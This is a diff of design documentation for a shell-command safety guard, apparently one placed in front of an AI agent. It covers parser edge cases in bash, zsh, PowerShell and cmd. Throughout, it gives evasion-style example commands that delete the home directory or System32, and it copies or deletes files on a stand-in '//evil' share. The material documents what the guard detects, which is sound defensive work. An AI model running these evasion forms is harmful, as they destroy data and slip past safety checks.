@@ -101,6 +101,23 @@ parsers are tree-sitter's bash, PowerShell and batch grammars.
   "comment" that hides a command cannot be read.
 - Fish has no grammar here. Its line is read as POSIX, which is still safe:
   what the grammar cannot parse comes back risky.
+- The bash grammar reads every word after the operator of a redirect as one
+  more file (`rm 2>/dev/null -rf ~`, `command >out rm -rf ~`) and the shell
+  only the first: the rest are arguments of the command, after the ones
+  written before the redirect, so the line is read as `rm -rf ~`. The same
+  for the words after a here-document's delimiter on the line it starts
+  (`rm <<EOF -rf ~`) and a redirect the grammar holds inside a
+  here-document's (`cat <<EOF > out -n`). On a list, a pipeline or a
+  negation they are the last command's, as the redirect is. A group, a loop,
+  a subshell or a function takes no arguments, and the shell refuses such a
+  line (`{ ls; } > out rm -rf ~`): it is `unreadable`, `has words after a
+  redirect that cannot be read`. So is a declaration (`export`, `declare`,
+  `local`, `readonly`, `typeset`) or an `unset` with words after the file of
+  its redirect (`export 2>/dev/null FOO=1`): the shell runs it, but the
+  grammar reads it as no plain command, and the guard does not give it the
+  words back. A `{NAME}` stuck to a redirect operator (`exec {fd}>out`,
+  `exec {fd}>&-`) is where bash puts the descriptor it opens, not an
+  argument.
 
 ### Wrappers and scripts
 
@@ -210,17 +227,50 @@ one (`coproc NAME { … }`). The program is the first word past the name, the
 `{` words that open the group (`coproc { { rm -rf ~; }; }` is read through
 both), `NAME=value` words and `!`, as it is without `coproc`: `coproc FOO=1 rm
 -rf ~`, `coproc { ! rm -rf ~; }` and `coproc NAME { FOO=1 rm -rf ~; }` judge
-the `rm`. The grammar has no `coproc`, so three forms are not read, and are
-risky:
+the `rm`. A redirect in front of the command gives the command its words
+back, as any redirect does (see [Splitting](#splitting)): `coproc { 2>/dev/null
+rm -rf ~; }` and `coproc > out rm -rf ~` are `Delete`. The grammar has no
+`coproc`, so two forms are not read, and are risky:
 
 - A loop, conditional, `case` or function after it, or inside its group
   (`coproc while …; do …; done`, `coproc NAME { for …; do …; done; }`), is cut
   into pieces whose body hides behind the program `do`: `Unreadable`.
-- A redirect in front of the command (`coproc { 2>/dev/null rm -rf ~; }`,
-  `coproc > out rm -rf ~`): the grammar takes the words after its target for
-  more targets, so the command is not among the arguments: `Unreadable`.
 - A `{` stuck to a word (`coproc {rm -rf ~;}`): zsh runs it as a group, the
   grammar reads `{rm` as a program of that name: `Unreadable`.
+
+The other words that start a command of their own are read the same way,
+since the grammar does not read a group or a negation after them either.
+bash's and zsh's `time` (after its `-p`) runs the command after it, past `{`,
+`!` and `NAME=value` words: `time { rm -rf ~; }`, `time ! rm -rf ~` and
+`time FOO=1 rm -rf ~` judge the `rm`. After `!` the grammar reads a group's
+`{` as a program; wherever `{` or `!` is a program, the command after it is
+what runs: `! { rm -rf ~; }` is `Delete`. zsh's `repeat
+N` runs the command or group after its count (`repeat 3 rm -rf ~`, `repeat 3 {
+rm -rf ~; }`), or the list after `do` (`repeat 3 do rm -rf ~; done`). A loop,
+a conditional or a function after any of them (`time for …`, `! while …`), and
+a `{` stuck to a word (`time {rm -rf ~;}`, `! {rm -rf ~;}`), are cut up by the
+grammar as after `coproc`, and are `Unreadable`: a program named `while`, `if`,
+`for` or any of the words that open such a command, and one that starts with a
+`{`, is read so wherever it stands. So is a program named `do`, `then`, `elif`
+or `else`, the body of a loop or a conditional the grammar cut off from the
+words that open it: zsh skips the separators after `repeat`'s count, so
+`repeat 3; do rm -rf ~; done`, on one line or on three, runs the `rm` three
+times, and the grammar reads `repeat 3` and a program named `do`.
+
+The program after a wrapper is the word the shell makes of it. A brace list
+(`command {rm,-rf,~}`, `r{m,x} -rf ~`) or a sequence expression (`r{m..m} -rf
+~`, `{1..3}`, `{a..c}`, `{1..9..2}`) is spelt out into words, the first of
+which is the program: `Unreadable`, `runs a program a brace list names, which
+cannot be read`, behind a wrapper or not (`{rm,-rf,~}` alone is a line the
+grammar cannot parse). The check reads the word as the shell has it after
+quotes are taken out, so a quoted list (`'{rm,-rf,~}'`), which the shell does
+not spell out, is `Unreadable` too. A word with an unquoted wildcard (`./* -rf
+/`, `?? -rf /`, `[r]m`) names the first file it matches, so the program is
+only known when it runs: `Unknown`, as for `$CMD`. A quoted one (`'*' -h`) is
+the name as written; behind a wrapper (`env ./* -rf /`) the guard no longer
+knows whether the word was quoted, and reads a wildcard as one either way,
+also behind zsh's `noglob` (`noglob ./*`), which keeps the shell from
+expanding it. A `[` alone is a name, as the program `[` is.
 
 A script handed to a shell is split again, in its own grammar: `bash -c`,
 `eval`, `cmd /c`, `powershell -Command`, `Invoke-Expression`. A nested script
@@ -301,7 +351,13 @@ and its findings are the line's, since the shell runs it as the same user.
   order: source then action for `Register-EngineEvent`; object, event, source
   then action for `Register-ObjectEvent`; class or query, source then action
   for `Register-WmiEvent` and `Register-CimIndicationEvent`.
-  `Register-ObjectEvent $timer Elapsed`, with no action, is safe.
+  `Register-ObjectEvent $timer Elapsed`, with no action, is safe. The
+  `-Action` block of `Set-PSBreakpoint`, which runs when the breakpoint is
+  hit, and a block set as a hook of `$ExecutionContext.InvokeCommand`
+  (`CommandNotFoundAction`, `PreCommandLookupAction`,
+  `PostCommandLookupAction`, `LocationChangedAction`, by assignment or by
+  its `set_` method), which runs when a command is looked up or the location
+  changes, run later the same way.
 - cmd has nothing like it.
 - **`PS4` and `BASH_ENV`** in a POSIX shell. bash expands the value of `PS4`
   (with `$(…)`, backticks and `$((…))`) every time `set -x` prints a trace
@@ -448,7 +504,9 @@ line leaves things, whichever is more conservative and needs the least state:
 A `cd` (or `pushd`, or `Set-Location`) moves the rest of the line. A later
 relative path is judged from where it moved to. A `cd` inside a subshell or a
 nested script in a process of its own does not reach the rest of the line;
-`eval` runs in this shell, so its `cd` does; in a pipeline only zsh runs the
+`eval` runs in this shell, so its `cd` does, and so does the `cd` in a string
+PowerShell's `Invoke-Expression` runs (`iex 'cd C:\Windows'`), since the session
+has one location; in a pipeline only zsh runs the
 last stage in this shell, but, as for a `cd`, any stage counts. Where a `cd` went is
 unknown when its target is, and then so is every relative path after it.
 A device (`$null`, `NUL`, `NUL:`, `CON`, `/dev/null`) is the same in any folder,
@@ -572,8 +630,10 @@ or a function body, which runs again from where the last pass left the line
 `f() { cd .. > x; }; f; f`; in PowerShell `foreach`, `ForEach-Object`, `while`,
 `for` and `function`), and when an earlier `cd` may not have moved the line: it
 ran in a pipeline stage or in the background, on the right of `&&` or `||`, in
-a branch of an `if`, `case` or `switch` or a `try`, on the left of `||`, or
-through a wrapper that runs it as a program or in a shell of its own, such as
+a branch of an `if`, `case` or `switch` or a `try`, on the left of `||` (not
+one whose right side ends the shell, `cd s || exit`: see "A script a line
+writes and then runs" below), or through a wrapper that runs it as a program
+or in a shell of its own, such as
 `env`, `nohup`, `timeout`, `coproc` or cmd's `start` (`cd sub || cd .. > ../x`,
 `if false; then cd sub; fi; cd .. > ../x`, `env cd sub; cd .. > ../x`; the same
 in PowerShell and cmd). Only a `cd` after one of those is read this way: a
@@ -582,6 +642,64 @@ line is, as before.
 
 In PowerShell, `cd -` and `cd +` go back or forward in location history, so the
 place is only known when it runs.
+
+A PowerShell session has one location, whatever scope a block runs in, and
+some of what moves it is not a `cd` the line shows. Then the place, and every
+relative or rooted path after it, is only known when it runs: a script block or
+a script run by a name only known when it runs (`& $b`, `. $b`, `&
+(Get-Command f)`; a block written out, `& { … }`, is read where it stands), an
+`Invoke-Expression` of a string not written out (`iex $s`, `iex "cd $d"`, a
+download), and the process's own folder set by
+`[Environment]::CurrentDirectory = …` or `[IO.Directory]::SetCurrentDirectory`,
+which a .NET call and a program the session starts may take. A method of
+`$ExecutionContext.SessionState.Path` is the cmdlet it stands for, read with
+the string it is given: `SetLocation('C:\Windows')` is `Set-Location
+C:\Windows`, `PushCurrentLocation`, `PopLocation` and `SetDefaultLocationStack`
+the stack steps below. Called on anything else (a variable that may hold the
+paths) the place, and the stack, are only known when it runs.
+
+`Set-Location`, `Push-Location` and `Pop-Location` are read by their own
+parameters, so the value of `-StackName` is not the folder: `Push-Location
+-StackName s C:\Windows` goes to `C:\Windows`. `Push-Location` with no path
+saves where the line is and stays there, and `Set-Location -StackName s` only
+picks the stack the others use when not given one. The line keeps the folders
+`Push-Location` saved, on each stack by name, so a `Pop-Location` goes back to
+the last one saved on its stack, and to every other folder the line may have
+been in then: `Push-Location src; Pop-Location; Remove-Item -Recurse build`
+deletes `<cwd>\build`. Only a step the line is certain to take, in order, is
+kept. After one that may not run or may run again (in a branch, a loop, a
+function body, on the right of `&&` or `||`, behind a wrapper, or in an action
+that runs later), after a block or a script the guard does not read that may
+move the line (`& $b`, `iex $s`), which may save or take a folder too, and
+after a `Pop-Location` of a stack the line did not fill,
+which holds what the session saved before the line, or of a stack only known
+when it runs, a `Pop-Location` goes to a place only known when it runs.
+The same holds after a location cmdlet in a later stage of a pipeline, which
+runs once for each item and may take its folder and its stack from each
+(`Import-Csv s.csv | Pop-Location`); after one given an argument that does not
+bind (`Pop-Location -WhatIf`, `Pop-Location x`, `Push-Location -Foo x`, an
+unknown or ambiguous parameter, a value parameter with no value, more folders
+than it takes, or a splat), which stops it before it does anything; and once
+the line defines a function or sets an alias named as one of them
+(`function Pop-Location { }`, `Set-Alias popd Get-Date`), or an alias whose
+name is only known when it runs (`Set-Alias $n …`, `Import-Alias`), which may
+stand in for it. A process or a runspace of its own (a job's block, a thread
+job's, a `ForEach-Object -Parallel` block, a nested `pwsh -Command`) starts
+with empty stacks, so a `Pop-Location` there takes nothing the line saved and
+goes to a place only known when it runs (`Push-Location C:\Windows; Start-Job
+{ Pop-Location; Remove-Item -Recurse System32 }` deletes
+`C:\Windows\System32`), and the line's stacks are as they were after it.
+
+The blocks of `Start-Job` run in a process of their own, so a `cd` in them does
+not move the line. They start in its `-WorkingDirectory`, joined to where the
+line is (`Start-Job -WorkingDirectory ~ { Remove-Item -Recurse .\build }` deletes
+`~\build`), and where the line is when it names none, as PowerShell 7 starts
+them; Windows PowerShell 5.1 starts such a job in `~\Documents`, which the guard
+does not read. They are read after the
+rest of the command, whose arguments and redirects the session runs before the
+job starts. When a job has more than one block and one of them moves, which
+runs first (`-InitializationScript` runs before the block, wherever it is
+written) is not read, and every path in them is only known when it runs.
 
 In a POSIX shell `pushd` has options before its folder, as `cd` has, and none
 of them is the folder: `-L` and `-P` are skipped (`pushd -P ~/.ssh && cat
@@ -614,9 +732,13 @@ that one path, so a `..` in the name is applied and a device path (`NUL`, `CON`)
 is never the item itself. `$null` is the null value in any provider.
 
 In PowerShell a rooted path with no drive (`\x`, `/x`, as in `cd \`) is on the
-drive of the folder before it, so after `cd HKCU:\Software\Foo` it is
-`HKCU:\x`, and after `cd Function:` it is `Function:\x`; it is on the file
-system only when the folder before it is (a disk, or no earlier `cd` at all).
+drive or share of the folder before it, so after `cd HKCU:\Software\Foo` it is
+`HKCU:\x`, after `cd Function:` it is `Function:\x`, and after `cd
+\\server\share\x` it is `\\server\share\x` (`\\?\UNC\server\share\x` and
+`\\?\C:\x` are read for the share and the drive they name; another `\\?\` or
+`\\.\` folder has no root the guard reads, so the path is only known when it
+runs); it is on the file system only when the folder before it is (a disk, a
+share, or no earlier `cd` at all).
 When that folder is only known when it runs, or is a provider path with no drive (`Registry::HKEY_CURRENT_USER\...`),
 so is the rooted path. `~` is the home of the provider the folder is in, and
 only the file system has one: after a `cd` to the registry, `Function:`, a
@@ -1459,12 +1581,41 @@ a path.
   listed, their short forms and the hex shapes are tried, so a pattern that
   fits some other branch name (`dev`) is not told.
 - A PowerShell provider-qualified path (`FileSystem::C:\x`) is its provider's
-  own path.
+  own path. A relative one (`FileSystem::x`,
+  `Microsoft.PowerShell.Core\FileSystem::x`) is from the folder the line is in,
+  as a plain one is (`cd C:\Windows; Remove-Item -Recurse FileSystem::System32`
+  deletes `C:\Windows\System32`); after a `cd` to another provider, or to a
+  place only known when it runs, it is only known when it runs.
 - A path built at run time, or by a brace list such as `{~,x}`, is unknown.
 - `NUL` is the null device in any folder, and so is PowerShell's `$null` value (see "Where a line is"); in PowerShell a bare `NUL` or `CON` is one only on the file system. In a POSIX shell `$null` is the variable `null`, only known when it runs; in cmd, and quoted in PowerShell, it is a file name. In a longer PowerShell word `$null` is the empty string: `$null\Windows` is `\Windows`, a folder at the top of the disk.
 - In PowerShell and cmd a name is read the way Windows reads it: `.git.`, `.git `
   and `GIT~1` are the repository's history, and `x.txt:stream` is known only
   when it runs (see [Core](core.md#what-core-judges)).
+- **A cmd argument that starts with `/` is a switch only by its shape**: a
+  switch name (letters, digits, `-`, `+` and `?`: `/q`, `/-y`, `/?`, `/mir`),
+  or a run of names of at most three characters each (`/s/q`), each with an
+  optional `:value` (`/a:-d`, `/R:3`, `/a:h/s/q`). Anything else is a path,
+  judged where it lands, which can only be stricter than a switch: a text that
+  starts with two separators (`//evil/share/x`, `//?/C:/Windows`, `/\evil\s`)
+  is a share or a long path, as its backslash spelling is, so `del
+  //evil/share/x` and `del /s /q //?/C:/Windows` are `delete` and `copy x
+  //evil/s` is `overwrite`; one core reads as a device (`/dev/sda`) is that
+  device; one with a `\` or a `.`, a run with a longer part
+  (`/evil/share/x`), or a value that holds a separator or starts with a drive
+  (`del /a:C:/Windows`) is a path. A built-in command splits an argument at
+  `,`, `;` and `=` first, and each part is a switch or a path of its own
+  (`del /q;//evil/s`). cmd's built-ins (`del`, `rd`, `copy`, `move`, `ren`,
+  `md`, `mklink`) and `xcopy` take only their own switch names, every name of
+  a run among them: cmd never reads a quoted word as a switch and the guard
+  no longer sees the quotes, so `rd /s /q "/Users"` deletes the folder
+  `\Users` and is `delete`, as is `rd /s /q /Users`. A switch whose value
+  names a file has the value judged: `xcopy /exclude:` reads a list of
+  strings to skip and is no operand;
+  `robocopy`'s `/LOG:`, `/LOG+:`, `/UNILOG:` and `/UNILOG+:` write a log and
+  `/SAVE:` a job file (the name and `.rcj`), each judged as a write
+  (`robocopy a b /LOG:C:\Users\me\.bashrc` is `overwrite`, and so is
+  `/LOG:%X%`, a write to a place known only when it runs); `/JOB:` copies
+  by a job file the guard never reads, so it is `unknown`.
 
 Inside a workspace or a temporary directory is the agent's own. Not the agent's
 own: the home directory, a system folder, the root of a disk, the workspace
@@ -2092,6 +2243,12 @@ A line is never safe because the guard gave up on it. These come back risky:
   double-quoted span holds `$(` or a backtick (`--format="$(echo a>f)"`).
 - A database statement known only when it runs: `psql -c "$Q"`.
 - A path built at run time or by a brace list.
+- A program named by a brace list or a wildcard (`command {rm,-rf,~}`, `./*
+  -rf /`).
+- A loop, a conditional or a `{` stuck to a word after `time`, `!`, `coproc`
+  or zsh's `repeat` (`time for …; do …; done`, `! {rm -rf ~;}`), and words
+  after the file of a redirect on a group, a loop or a subshell (`{ ls; } >
+  out rm -rf ~`), which the grammar cuts up.
 - A line the grammar cannot parse.
 - Shells nested past a limit, a parse tree nested too deep, or a line longer
   than the limit.
@@ -2178,6 +2335,38 @@ Some risks only show when units are read together.
   its name, as above: a run of a script of that name is `unknown`, and one of
   another name (`echo x > log; cd a; cd b; cd c; cd d; cd e; cd f; ./app`)
   stays safe.
+  An `||` whose right side ends the shell is the exception: in `cd s ||
+  exit` the rest of the line runs only when the left side did not fail, so
+  the `cd` ran, and so did every `cd` on the right of an `&&` before the
+  `||` (`cd a && cd b || exit`). After the list the line is only where the
+  left side took it, for a run of a file and for every other check (where
+  paths are placed, where a redirect opens): `echo x > x.sh; cd s || exit;
+  bash x.sh` and `cd a || exit; make > log; cd ../b || exit; make > log; cd
+  ../c || exit; make > log; cd ../d || exit; ./build.sh` stay safe, while
+  `echo x > x.sh; cd s || exit; bash ../x.sh` is `unknown`. The right side
+  itself still runs where the failed `cd` left the line (`echo x > x.sh; cd
+  s || { bash x.sh; exit; }` is `unknown`). A right side ends the shell when
+  it is the builtin `exit`, alone or last in a `{ …; }` group (in cmd,
+  `exit`, `exit /b`, alone or last in a `( … )` block, which runs in cmd
+  itself). Nothing else does: `true`; `return`, which bash goes on past
+  outside a function (inside one, its `cd` is already one that may not have
+  run); an `exit` with a redirect of its own, before or after its name
+  (`<nofile exit`, `exit <<< x`, `exit 2> /dev/null`: the grammar puts the
+  last on the whole list), which does not run when the redirect fails; one
+  with more than one argument, or one that may expand to more (`exit 1 2`,
+  `exit *`, `exit "$@"`), which zsh goes on past; one in a subshell, a
+  pipeline or the background, which ends only that process; one after the
+  line defines a function of that name, or uses `alias`, `enable` or
+  `disable`; cmd's `exit /?`, or any argument with `/?` in it (`exit /b/?`),
+  which prints its help; and PowerShell's `exit`, which its grammar reads
+  after `||` as a command. Nor is a left side that may succeed when its `cd`
+  failed taken as one whose `cd` ran: one with a `!` anywhere in it (`! cd s
+  || exit`, `{ ! cd s; } || exit`, `cd a && ! cd b || exit`), and any left
+  side once the line defines a function named `cd`, `chdir`, `pushd` or
+  `popd` (`cd() { :; }; cd s || exit`), which may return 0 without moving
+  the line. An `||` before it in the same list still counts (`true || cd s
+  || exit; bash x.sh` runs where the line began when `true` succeeds), and so
+  does a left side that ends in `|| true`.
   The file may be run as the program itself, not only handed to a shell: a
   program named by a path (`./x.sh`, `x/run`, `/tmp/x`, `~/x.sh`) is that
   file, so `echo 'rm -rf ~' > x.sh; ./x.sh` and `curl -o run URL; chmod +x
